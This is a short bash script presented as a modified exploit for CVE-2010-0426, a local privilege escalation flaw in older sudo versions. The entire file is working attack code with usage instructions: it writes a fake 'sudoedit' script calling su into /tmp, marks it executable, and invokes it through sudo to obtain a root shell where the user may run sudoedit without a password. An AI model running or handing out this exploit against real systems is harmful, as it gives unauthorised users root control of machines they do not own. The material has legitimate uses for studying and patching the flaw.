#!/usr/bin/env bash
# CVE-2010-0426 exploit modified by @404death
# https://www.exploit-db.com/exploits/11651
# Usage :::::
# user@b0x:~$ sudo -l
#        User user may run the following commands on this host:
#	       (root) NOPASSWD: sudoedit /etc/hosts
# user@b0x:~$ ./sudoedit_exp.sh /etc/hosts

prepare() {
cat << EOF >> /tmp/sudoedit
#!/bin/sh
su
/bin/su
EOF
}

exploit() {
	printf "[+] Prepared sudoedit...\n"
	prepare && chmod a+x /tmp/sudoedit
	printf "[+] Run sudoedit\n"
	cd /tmp/ &&  sudo ./sudoedit ${1}
	printf "[+] Done\n"
}

main() {
	printf "[+] CVE-2010-0426 exploit mod by @404death\n"

	if [ -z "${1}"   ]; then
		printf "[-] Please inform a file as parameter\n"
		exit -1
	else
		FILE=${1}
	fi

	exploit ${FILE}
}; main ${1}
